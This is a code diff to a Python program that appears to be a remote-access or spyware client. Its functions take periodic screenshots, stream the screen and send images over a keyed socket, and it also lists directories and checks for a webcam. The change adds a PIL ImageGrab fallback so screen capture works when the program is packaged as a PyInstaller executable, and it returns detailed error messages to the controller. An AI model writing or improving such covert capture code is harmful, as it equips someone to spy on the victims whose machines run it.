@@ -63,11 +63,12 @@ except ImportError:
 
 try:
     import pyautogui
-    from PIL import Image as _PIL_Image
+    from PIL import Image as _PIL_Image, ImageGrab as _ImageGrab
     SCREENSHOT_AVAILABLE = True
 except ImportError:
     SCREENSHOT_AVAILABLE = False
     _PIL_Image = None
+    _ImageGrab = None
 
 WEBCAM_AVAILABLE = False
 try:
@@ -202,7 +203,7 @@ def _screenshot_auto_thread(spool, stop_event, interval=300):
         if not SCREENSHOT_AVAILABLE:
             continue
         try:
-            screenshot = pyautogui.screenshot()
+            screenshot = _grab_screen()
             buf = io.BytesIO()
             screenshot.save(buf, format="PNG")
             b64 = base64.b64encode(buf.getvalue()).decode()
@@ -319,13 +320,21 @@ def list_directory(path):
         return f"[!] Error: {e}"
 
 
+def _grab_screen():
+    """Try pyautogui first, fall back to PIL.ImageGrab (works in PyInstaller .exe)."""
+    try:
+        return pyautogui.screenshot()
+    except Exception:
+        return _ImageGrab.grab()
+
+
 def take_screenshot(sock, key, send_lock):
     if not SCREENSHOT_AVAILABLE:
         with send_lock:
-            send_msg(sock, "FAIL", key)
+            send_msg(sock, "FAIL: pyautogui/pillow not installed", key)
         return
     try:
-        screenshot = pyautogui.screenshot()
+        screenshot = _grab_screen()
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format="PNG")
         with send_lock:
@@ -333,7 +342,7 @@ def take_screenshot(sock, key, send_lock):
             send_msg(sock, img_bytes.getvalue(), key)
     except Exception as e:
         with send_lock:
-            send_msg(sock, "FAIL", key)
+            send_msg(sock, f"FAIL: {e}", key)
         logger.error(f"Screenshot error: {e}")
 
 
@@ -380,7 +389,7 @@ def stream_screen(sock, key, stop_event, send_lock):
     _STREAM_MAX_H = 1080
     try:
         while not stop_event.is_set():
-            screenshot = pyautogui.screenshot()
+            screenshot = _grab_screen()
             w, h = screenshot.size
             if w > _STREAM_MAX_W or h > _STREAM_MAX_H:
                 scale = min(_STREAM_MAX_W / w, _STREAM_MAX_H / h)
